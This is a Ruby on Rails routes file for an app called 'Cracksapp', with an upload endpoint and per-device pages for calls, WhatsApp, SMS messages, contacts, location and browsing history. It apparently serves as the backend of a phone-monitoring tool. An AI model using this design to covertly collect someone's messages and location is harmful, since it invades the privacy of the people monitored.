Cracksapp::Application.routes.draw do
  devise_for :users
  # The priority is based upon order of creation: first created -> highest priority.
  # See how all your routes lay out with "rake routes".

  post 'upload' => 'upload#index'

  get 'general/:id' => 'general#index'
  get 'calls/:id' => 'calls#index'
  get 'whatsapp/:id' => 'whatsapp#index'
  
  get 'sms/:id' => 'sms#index'
  get 'sms/:id/messages/:address' => 'sms#messages'
  
  get 'contacts/:id' => 'contacts#index'
  get 'location/:id' => 'location#index'
  get 'history/:id' => 'history#index'

  root 'devices#index'
end
